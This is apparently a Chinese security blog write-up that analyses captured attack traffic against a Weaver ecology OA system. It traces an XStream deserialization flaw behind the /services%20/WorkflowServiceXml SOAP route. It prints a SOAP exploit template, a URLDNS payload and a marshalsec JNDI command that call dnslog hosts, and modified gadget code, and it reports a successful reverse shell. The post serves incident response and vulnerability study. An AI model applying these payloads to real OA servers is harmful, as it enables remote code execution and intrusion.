> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/68sQAkT3CBff4Y40OPJvxQ)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPNb1DMlYoc0m0gic1lLaskCTFIShpnkBJYpA9scnGvmzy27XSCtycs9w/640?wx_fmt=png)

作者：清水川崎 @滴滴出行 SSTG Basic Security Team  

**0****1**

**写在前面**

  

  

朋友在 2021 年 HVV 中作为防守方抓到了一段流量，刚开始没有太过于在意，随后在 t00ls 论坛中也发现了这段流量，随即觉得事情并不简单。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdP5FeXhmQ7kticCWynYg1OJFzgQrQSQUibyQR8Dy4tgZbS1bPfq8UicRUEw/640?wx_fmt=png)

**0****2**

**触发点  
**

  

  

根据流量可以得知路由为 / services%20/WorkflowServiceXml，我随即查看了该 OA 的 web.xml。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPghCgRMSf4ibZJXn7sZlAaG7LDkBEgeHPcxFic0iapw9miaBMFmBpW1oVVQ/640?wx_fmt=jpeg)

发现了相关类为 weaver.workflow.webservices.WorkflowServiceXml、weaver.workflow.webservices.WorkflowServiceImplXml。  
关于类的东西先放到一旁，毕竟路由是否真实存在、%20 有什么意义才是重点。我开始验证路由的存在。这里我测试了两个版本。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPQOlnuIRu49JwxsicMzanxBWDmh0OIyBJggaYDiaYdKl6ycvdojksm1jA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPiaib6Uic8VlJEibQsnID284zpbf7BlkJDL69zy12hdlUGTVViaHSmR7kqug/640?wx_fmt=png)

好家伙，我直接好家伙，不是阻断我，就是给我玩消失。  
那我带上 %20 试试？

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPEDHpmgrebCq8LUtnqSULgrV7d06PNKWPREkjibMc8TwBdVo76aZqYZw/640?wx_fmt=jpeg)

原来 404 和阻断都是骗人的啊！

**0****3**

**漏洞的 sink**

  

  

根据这个 response 可以看出这应该是一个 soap xml 注入，具体是 XMLDecoder、XStream 或者其他什么，还得看 weaver.workflow.webservices.WorkflowServiceXml、weaver.workflow.webservices.WorkflowServiceImplXml.  
首先，先看看 weaver.workflow.webservices.WorkflowServiceXml

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPmhia8qVq0ezjDU00FIS3OXicf5D0D6EAjc7kk3MrMElbUNzSm0XNmgiaw/640?wx_fmt=png)

可以注意到这是一个接口类，其中一个方法 doCreateWorkflowRequest 比较可疑。

去 weaver.workflow.webservices.WorkflowServiceImplXml 看看这个方法的实现。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPesVNTibqlo81UFpuibgylE25HkHtN7xc7axibx3AhAMHN321u0CLxoLug/640?wx_fmt=png)

继续跟踪看看

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPoKZEfdJmC1pAPtvwrkiaibROvK81P0QxSFs89MUeD66868OKSxaB2rwQ/640?wx_fmt=png)

这个 xs 咋看起来这么眼熟？看看 xs 是个啥，一般 Java 可能会定义在代码文件最上方。

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPQOrcEJn4IGJib4zb5gQv18M7O5M1OZmLWicqFmWZVc6bovHakeqBiaOjQ/640?wx_fmt=jpeg)

原来 xs 是 XStream 的对象，简直是妙蛙种子逛米奇妙妙屋——妙到家了。

**0****4**

**配合 SOAP 生成 Playload  
**

  

既然决定了 sink 点，下一步肯定是 POC 的撰写了，先确定 SOAP 基本模板。  
根据朋友给的流量可以确定基本 SOAP 消息体模板大致是这样的。

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
    <web:string></web:string>
        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>

```

验证一下我的想法

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPWSibWRhWd3YiccicdewGQc4PM7Sfnchhkmuv1LDjvjxpFoibwiahia5GiabiaQ/640?wx_fmt=png)

验证成功。  
接下来就是寻找 gadget 了。  
由于并没有完整源码，只有部分 github 源码，不能确定 gadget，先使用 URLDNS 试试。

```
<map>
  <entry>
    <url>http://1xsz12.dnslog.cn</url>
    <string>http://1xsz12.dnslog.cn</string>
  </entry>
</map>

```

组合我们的模板试试。  
这里涉及到实体编码问题，作为懒人直接选择整体编码算了。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPhAVYoozfbViahjFlEJL0OVY7yRjmPJiaozkkFxA7J16C0O9wMhMgug4w/640?wx_fmt=png)

随后 dnslog 成功收到请求。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdP7s1mswxCNgQN7CoAoKa2kbSiaLCdctuRFta5UicuYB8CicN7fYsWK8hMA/640?wx_fmt=png)

试试其他的 gadget？比如 CommonsBeanutils 的 jndi 注入？  
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream CommonsBeanutils ldap://h73xu6.dnslog.cn/a > cbu.xml

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPiam1yJrFQDCZoApuFU12BGCgZRvLMEDyIjQ7g4rjWAiaibKHQ1TROia18Q/640?wx_fmt=png)

最后反弹成功。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPsh4TCAqZKjz66xuYJ2EXR0epxsJXzFEmEJO9pbFq7wFEuWyoqImbFw/640?wx_fmt=png)

**0****5**

**marshalsec 和 ysoserial 的联姻**

  

大部分人都把 marshalsec 当做一个快速 JNDI 服务器的工具，其实它也有其他功能，比如生成 XStream 的 payload 就很好。

问题在于 marshalsec 内置的 gadget 全都需要出网，这一点儿也不符合我这个完美主义者的实战需求，需要出网的 payload 那是实验室黑客才需要的。那么既然 ysoserial 内置了不需要出网的 gadget，可以结合起来吗？当然可以！  
新建一个 idea 项目，将 marshalsec 和 ysoserial 都引入 classpath 作为依赖。然后重写 marshalsec.XStream，一个字也不要改。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPzPSGTFCuuSSCybGShib3iab7rmV84GckGmibQvtavhQMmXudOdqj1Iu4Q/640?wx_fmt=png)

继续重写 marshalsec.gadgets.CommonsBeanutils 的 makeCommonsBeanutilsJNDI 方法。  
这里以 URLDNS 作为举例

```
package marshalsec.gadgets;

import java.util.Collections;
import marshalsec.UtilFactory;
import marshalsec.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.URLDNS;

public interface CommonsBeanutils extends Gadget {
    @Primary
    @Args(
            minArgs = 1,
            args = {"jndiUrl"},
            defaultArgs = {"{exploit.jndiUrl:ldap://localhost:1389/obj}"}
    )
    default Object makeCommonsBeanutilsJNDI(UtilFactory uf, String... args) throws Exception {
        URLDNS urldns = new URLDNS();
        Object object = urldns.getObject(args[0]);
        return object;
    }
}

```

这下想要用 ysoserial 的什么 gadget，只需要新建一个基于该 gadget 的对象，使用其 getObject 方法即可。  
比如我已经实现了延时注入，可以判断不出网的机器是否存在漏洞，由于每次发包只是让线程阻塞 10s，且根据 response 时间即可判断，对服务器并无实际伤害，可以算是完美的无损 poc。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPSWl1ZwPYMic5gl7KZ6gib5hpoflVQC8SPJWgPsDD2iaBuVicBqvw1tIGdQ/640?wx_fmt=png)

具体实战，需要什么功能？比如写 webshell、内存 shell、回显等，请读者自行实现，这里我只提供思路。

**0****6**

**流量的解密**

  

  

书归正传，朋友抓到的流量到底对服务器干了啥？我们来看看。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPo3toCviaic1DXGvq8dkHKQLI7QXM9QQPknyVtx9vSwGNRkdDkjTooraw/640?wx_fmt=png)

可以判断使用了 CommonsBeanutils 和 CC3 的 gadget。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdPhz2tn4hRibA4Xia4MQouHXfsKicyo78iapQfzmIqmVY3gNm87HIIj4EUGQ/640?wx_fmt=png)

这段流量以 yv66vgAAAD 开头可以判断是 base64 的序列化 payload，尝试对流量整理，得到下面的流量。

```
yv66vgAAADIANgoACgAkBwAlCAAmCgACACcIACgKACkAKgoAAgArBwAsBwAtBwAuAQAGPGlujXI7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcALAEAClNvdXJjZUZpbGUBABBMb2dpbkZpbHRlci5qYXZhDAALAAwBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0BAB9EOlxXRUFWRVJcZWNvbG9neVxjc3NcbG9naW4uY3NzDAALADABAAVsb2dpbgcAMQwAMgAzDAA0ADUBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARUmVzaW4vTG9naW5GaWx0ZXIBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAQamF2YS9sYW5nL1N0cmluZwEACGdldEJ5dGVzAQAEKClbQgEABXdyaXRlAQAFKFtCKVYAIQAJAAoAAAAAAAQAAQALAAwAAQANAAAALwABAAEAAAAFKrcAAbEAAAACAA4AAAAGAAEAAAAMAA8AAAAMAAEAAAAFABAAEQAAAAEAEgATAAIADQAAAD8AAAADAAAAAbEAAAAC

```

对其进行解码

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6P7rHibDc7nYibZBMbeEbwdP2sSU0bsFW4aX5NuDmJ5pICzOBpibq1JD5dx03TLtAdNs8HbbnnCbibkA/640?wx_fmt=png)

不难看出写了个文件 D:\WEAVER\ecology\css\login.css，内容应该是 login12345

**0****7**

**后记**

  

  

这次流量的应急响应又加深了我对 XStream 以及某 OA 的印象，不可多得的一次机会。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

```
- End -

精彩推荐
【技术分享】Shiro 权限绕过的历史线（下）

【技术分享】Shiro 权限绕过的历史线（上）

【技术分享】前尘——与君再忆CC链

【技术分享】Intigriti史上最难XSS挑战Writeup


戳“阅读原文”查看更多内容

```